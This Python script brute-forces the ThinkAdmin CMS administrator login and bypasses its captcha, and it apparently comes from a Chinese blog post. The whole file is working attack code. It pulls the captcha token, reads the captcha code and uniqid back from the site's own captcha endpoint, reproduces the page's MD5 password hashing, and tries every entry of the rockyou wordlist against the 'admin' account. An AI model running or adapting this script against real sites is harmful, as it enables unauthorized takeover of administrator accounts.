# Script taken from https://mrwu.red/fenxiang/3892.html
# A script to bruteforce login and bypass thinkadmin CMS captcha.

import requests
import hashlib
import json
import fileinput
from bs4 import BeautifulSoup

urls = "http://127.0.0.1:81"
headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36',
'Cookie': 'sd9611012=udlbvtklamk6oil9mdfhqsr9au; thinkphp_show_page_trace=0|0; s3e5be473=vf1ljf9bg6rs9ngsc7lnhtlrc2'
}

def create_md5(pwd):
   md5_obj = hashlib.md5()
   md5_obj.update((pwd).encode("utf-8"))  
   return md5_obj.hexdigest()

#获取data-captcha-token
def token():
    try:
        url = "%s/admin/login.html"%(urls)
        html = requests.get(url,headers=headers)
        soup = BeautifulSoup(html.text, "html.parser")
        token = soup.find('label', {'data-captcha-type': 'login_captcha'}).get('data-captcha-token')
        return token
    except:
        print('token请求失败')

#根据data-captcha-token 获取code和uniqid
def value():
    try:
        url = "%s/admin/login/captcha"%(urls)
        d = {'type': 'login_captcha', 'token': token()}
        html = requests.post(url, data=d,headers=headers)
        html = json.loads(html.text)
        uniqid = html['data']['uniqid']
        code = html['data']['code']
        return uniqid,code
    except:
        print('value请求失败')

#登陆请求
def login(pwd):
    try:
        url = "%s/admin/login.html"%(urls)
        uniqid,code = value()
        pwds = create_md5(pwd)+uniqid
        md5 = create_md5(pwds)
        d = {
            'username': 'admin', 
            'password': md5,
            'verify':code,
            'uniqid':uniqid
        }
        html = requests.post(url, data=d,headers=headers)
        html = json.loads(html.text)
        print("%s     密码：%s"%(html['info'],pwd))
    except:
        print('login请求失败')

with fileinput.input(files=(r'//usr/share//wordlists//rockyou.txt'),openhook=fileinput.hook_encoded("utf-8")) as f:
    try:
        count=0
        for line in f:
            count = count+1
            print("第 %s 次尝试"%(count))
            if login(line.replace("\n", "")) == '登录成功':
                break
    except:
        print('爆破结束')
